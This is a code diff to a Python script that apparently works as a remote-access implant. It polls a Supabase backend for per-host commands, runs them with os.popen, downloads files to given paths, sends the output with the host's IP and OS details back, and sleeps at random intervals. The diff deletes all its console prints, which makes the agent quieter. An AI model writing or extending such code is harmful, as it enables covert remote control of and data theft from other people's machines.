@@ -1,3 +1,7 @@
+import logging
+
+logging.basicConfig(level=logging.WARNING)
+
 import os
 import time
 import random
@@ -157,14 +161,10 @@ def execute_commands():
         remote_path = upload.get('remote_path')
 
         if file_url and remote_path:
-            print(f"[DEBUG] Downloading {file_url} to {remote_path} on {hostname}")
             if download_from_supabase(file_url, remote_path, SUPABASE_KEY):
                 supabase.table("uploads").update({"status": "completed"}).eq("id", upload['id']).execute()
-                print(f"[SUCCESS] Downloaded {file_url} to {remote_path} on {hostname}")
             else:
                 supabase.table("uploads").update({"status": "failed"}).eq("id", upload['id']).execute()
-                print(f"[ERROR] Failed to download {file_url} to {remote_path} on {hostname}")
-
 
     # --- 2. Handle Other Commands ---
     pending_commands = fetch_pending_commands_for_hostname(hostname).data
@@ -179,25 +179,18 @@ def execute_commands():
             status, output = handle_upload_command(command_text, encoded_data) # Pass encoded data to handle_upload_command
         else:
             try:
-                print(f"[DEBUG] Executing command '{command_text}' on {hostname}")
                 result = os.popen(command_text).read()
                 status = 'Completed'
-                output = result
-                print(f"[SUCCESS] Command '{command_text}' executed on {hostname}")  
+                output = result 
             except Exception as e:
                 status = 'Failed'
                 output = str(e)
-                print(f"[ERROR] Command '{command_text}' failed on {hostname}: {e}")
 
         update_command_status(command_id, status, output, hostname, ip, os_info)
-
-
-
 
 if __name__ == '__main__':
     while True:
         timeout_interval, _ = fetch_settings()
         execute_commands()
         interval = random.randint(1, timeout_interval)
-        print(f"Sleeping for {interval} seconds.")
         time.sleep(interval)
